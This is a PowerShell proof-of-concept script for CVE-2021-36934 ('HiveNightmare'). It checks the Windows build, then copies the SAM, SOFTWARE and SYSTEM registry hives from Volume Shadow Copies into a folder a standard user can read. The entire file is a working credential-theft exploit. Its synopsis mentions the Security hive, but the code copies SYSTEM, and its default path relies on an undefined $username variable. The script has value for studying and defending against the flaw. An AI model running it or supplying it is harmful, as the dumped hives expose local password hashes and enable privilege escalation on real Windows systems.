<#
    .SYNOPSIS
        PoC for CVE-2021-36934, which enables a standard user to be able to retrieve the SAM, Security, and Software Registry hives in Windows 10 version 1809 or newer. 

        The vulnerability was discovered by @jonasLyk.

    .PARAMETER path
        Used to supply the path to dump the Registry hives. If the parameter isn't used, the path will be default to the user's desktop.

    .EXAMPLE
        PS C:\> .\Invoke-HiveNightmare.ps1 -path "c:\"
        
        Dumps the hives from the system's Volume Shadow Copies to C:\.
        
    .EXAMPLE
        PS C:\> .\Invoke-HiveNightmare.ps1 

        Dumps the hives from the system's Volume Shadow Copies to C:\users\[USERNAME]\desktop.

    .NOTES  
        File Name      : Invoke-HiveNightmare.ps1
        Version        : v.0.2
        Author         : @WiredPulse
        Created        : 21 Jul 21
#>

[CmdletBinding()]
param(
       $path = "C:\Users\$username\Desktop"
)

$outSam = "$path\Sam.hive"
$outSoft = "$path\Soft.hive"
$outSys = "$path\Sys.hive"

if(-not(test-path $path)){
    new-item $path -ItemType Directory | out-null
}

if(([environment]::OSVersion.Version).build -lt 17763){
    Write-Host -ForegroundColor red "[-] System not susceptible to CVE-2021-36934"
    pause
    break
}
else{
    Write-Host -ForegroundColor yellow "[+] " -NoNewline; Write-Host -ForegroundColor green "System is a vulnerable version of Windows"
}

for($i = 1; $i -le 9; $i++){
    try{
        [System.IO.File]::Copy(("\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy" + $i + "\Windows\System32\config\sam"), ($outSam + $i))
        Write-Host -ForegroundColor yellow "[+] " -NoNewline; Write-Host -ForegroundColor green "Dumping SAM$i hive..."
    } catch{}
    try{
        [System.IO.File]::Copy(("\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy" + $i + "\Windows\System32\config\software"), ($outSoft + $i))
        Write-Host -ForegroundColor yellow "[+] " -NoNewline; Write-Host -ForegroundColor green "Dumping SOFTWARE$i hive..."
    }
    catch{}
    try{
        [System.IO.File]::Copy(("\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy" + $i + "\Windows\System32\config\system"), ($outSys + $i))
        Write-Host -ForegroundColor yellow "[+] " -NoNewline; Write-Host -ForegroundColor green "Dumping SYSTEM$i hive..."
    }
    catch{}
}
if(test-path $path\s*.hive*){
    Write-Host -ForegroundColor yellow "[+] " -NoNewline; Write-Host -ForegroundColor green "Hives are dumped to $path"
}
else{
    Write-Host -ForegroundColor red "[-] There are no Volume Shadow Copies on this system"
}